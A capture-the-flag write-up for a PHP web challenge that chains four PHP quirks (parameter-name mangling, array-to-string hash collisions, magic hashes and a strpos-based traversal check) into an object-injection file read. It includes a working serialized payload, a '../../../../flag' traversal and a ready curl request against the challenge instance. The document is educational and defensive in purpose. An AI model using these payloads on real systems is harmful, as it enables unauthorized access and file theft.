# Ultimative PHP

| Field | Value |
|---|---|
| Platform | FortID CTF |
| Category | Web |
| Challenge file | [`index.php`](index.php) |
| Status | Solved |
| Flag | Omitted |

## Challenge overview

The service calls itself a "migration gateway". Everything happens in one `GET` request to `index.php`, and the gateway refuses to keep any state between attempts, so all proofs have to validate together. Reading `index.php`, four separate checks stand between us and the final block that prints the flag:

1. an administrator `access_level` that must be set without the raw query string ever containing the string `access_level`;
2. two recovery answers that must be different values of the same type, yet hash to the same fingerprint;
3. a compatibility `code` that must pass a deliberately broken hash comparison;
4. a Base64url-encoded serialized PHP object that must come back as a `MigratedProfile`.

Only after all four pass does the page reach:

```php
echo '<p class="flag">' . htmlspecialchars((string) $profile, ...) . '</p>';
```

So the plan is to satisfy the four checks and then make `(string) $profile` return the contents of the flag file. Each check is one classic PHP quirk, so the write-up goes through them in order.

## 1. access_level: parameter name mangling

```php
$rawQuery = $_SERVER['QUERY_STRING'] ?? '';

if (str_contains(rawurldecode($rawQuery), 'access_level')) {
    fail_request('The access_level parameter is protected');
}

if (($_GET['access_level'] ?? '') !== 'administrator') {
    fail_request('Administrator access required');
}
```

This looks contradictory: the literal text `access_level` must not appear in the query string, but `$_GET['access_level']` still has to equal `administrator`. The way out is a long-standing PHP habit: when PHP builds `$_GET`, it rewrites certain characters in a parameter name into an underscore. A dot is one of them, so `access.level` in the URL becomes the key `access_level` in `$_GET`.

That splits the two checks apart. The raw query string contains `access.level` (with a dot, so the `str_contains` guard never sees `access_level`), while PHP hands the application `$_GET['access_level'] = 'administrator'`.

```
?access.level=administrator
```

## 2. Recovery answers: the "Array" collision

```php
if (get_debug_type($primary) !== get_debug_type($backup)) {
    fail_request('Recovery answers must use the same format');
}
if ($primary === $backup) {
    fail_request('Recovery answers must be different');
}

$primaryMaterial = 'legacy-recovery:v1:' . $primary;
$backupMaterial = 'legacy-recovery:v1:' . $backup;

if (!hash_equals(hash('sha256', $primaryMaterial), hash('sha256', $backupMaterial))) {
    fail_request('Recovery fingerprints do not match');
}
```

The two answers must be the same type, must not be identical, and must hash to the same value after being concatenated onto a prefix string. For normal strings that is impossible without a full SHA-256 collision.

The trick is that PHP lets a query parameter be an array by using `[]` in the name. If both answers are arrays, they share the type `array`, and two arrays with different contents are not `===` identical, so the first two checks pass. The concatenation is where it pays off: joining a string with an array produces the literal text `Array` (PHP only raises a warning, and the container has `display_errors = Off`). Both materials therefore become `legacy-recovery:v1:Array`, so their SHA-256 values are identical and `hash_equals` is happy.

```
&primary[]=a&backup[]=b
```

## 3. Compatibility code: a double magic hash

```php
$material = 'ULTIMATIVE-PHP-2026:' . $code;
$legacyDigest = substr(hash('md5', $material), 0, 9);
$modernDigest = substr(hash('sha256', $material), 0, 9);

if (!($legacyDigest !== $modernDigest && $legacyDigest == $modernDigest)) {
    fail_request('The compatibility code was rejected', ...);
}
```

The condition wants the two 9-character prefixes to be strictly different (`!==`) and at the same time loosely equal (`==`). That combination is exactly the PHP "magic hash" behaviour: when both strings look like `0e` followed by digits, PHP reads them as numbers in scientific notation, both equal to zero, so `==` is true, while the raw strings differ, so `!==` is also true.

So we need a `code` where both `md5(material)[:9]` and `sha256(material)[:9]` are of the form `0e` plus seven digits. Finding one is just brute force. The short script [`find_code.py`](find_code.py) iterates numeric codes until both prefixes are magic. A working result:

```
code   = 59036305
md5    = 0e3791209
sha256 = 0e9920675
```

Both prefixes are `0e` and digits, and they are different strings, so the gateway accepts the code.

```
&code=59036305
```

## 4. Profile: object injection into a path traversal

```php
$profile = @unserialize($serializedProfile, [
    'allowed_classes' => [MigratedProfile::class, LegacyTemplate::class],
]);

if (!$profile instanceof MigratedProfile) {
    fail_request('Unsupported profile type');
}
...
echo '<p class="flag">' . htmlspecialchars((string) $profile, ...) . '</p>';
```

`unserialize` is restricted to two classes, but those two classes are enough. Look at what they do when cast to a string:

```php
final class MigratedProfile {
    public $displayName = 'guest';
    public function __toString(): string {
        return (string) $this->displayName;   // casts displayName again
    }
}

final class LegacyTemplate {
    public $template = 'welcome.txt';
    public function __toString(): string {
        if (strpos($this->template, '../')) {        // bug is here
            return '[invalid template]';
        }
        $path = __DIR__ . '/templates/' . $this->template;
        return (string) file_get_contents($path);
    }
}
```

`MigratedProfile::__toString` just casts `displayName` to a string. If `displayName` is itself a `LegacyTemplate`, printing the profile chains into `LegacyTemplate::__toString`, which reads a file under `templates/`.

The guard `if (strpos($this->template, '../'))` is the classic `strpos` mistake. `strpos` returns the position of `../`, and if `../` sits at the very start of the string, the position is `0`, which PHP treats as false. So a template value that *begins* with `../` passes the guard untouched. From there it is a plain path traversal out of the templates directory:

```
templates/ + ../../../../flag  ->  /flag
```

and the container symlinks `/flag` to the file holding the real flag.

So the payload object is a `MigratedProfile` whose `displayName` is a `LegacyTemplate` with `template = "../../../../flag"`:

```
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:16:"../../../../flag";}}
```

[`build_profile.py`](build_profile.py) prints this serialized string and its Base64url form (the gateway's `decode_base64url` tolerates missing padding):

```
TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319
```

## Putting it together

There is no exploit script to run against a socket here. The whole attack is one crafted URL. Take the address the instancer gives you and open this in the browser address bar:

```
<ENDPOINT>/?access.level=administrator&primary[]=a&backup[]=b&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319
```

For example, if the instancer hands you `https://ultimative-php-abc.inst9.ctf.fortid.com`, the full request is that host followed by the query string above. The page then renders the flag in the `Migration completed` block.

The same request from a terminal, if you prefer `curl`:

```sh
curl 'https://<ENDPOINT>/?access.level=administrator&primary[]=a&backup[]=b&code=59036305&profile=TzoxNToiTWlncmF0ZWRQcm9maWxlIjoxOntzOjExOiJkaXNwbGF5TmFtZSI7TzoxNDoiTGVnYWN5VGVtcGxhdGUiOjE6e3M6ODoidGVtcGxhdGUiO3M6MTY6Ii4uLy4uLy4uLy4uL2ZsYWciO319'
```

## Takeaways

- PHP rewrites `.` (and a few other characters) in a parameter name into `_`, so a filter on the raw query string and a lookup in `$_GET` can be made to disagree.
- Concatenating a string with an array yields the text `Array`, which turns "two different inputs" into "the same hashed material".
- A double magic hash is just a brute force: two independent `0e`-and-digits prefixes satisfy loose `==` while staying strictly `!==`.
- `strpos(...)` returning `0` is falsy, so an "is `../` present" check placed as `if (strpos(...))` misses a traversal that starts at position 0.
- An `allowed_classes` list is not safe by itself if the permitted classes have `__toString` methods that reach the filesystem. Here two harmless looking classes chain into an arbitrary file read.
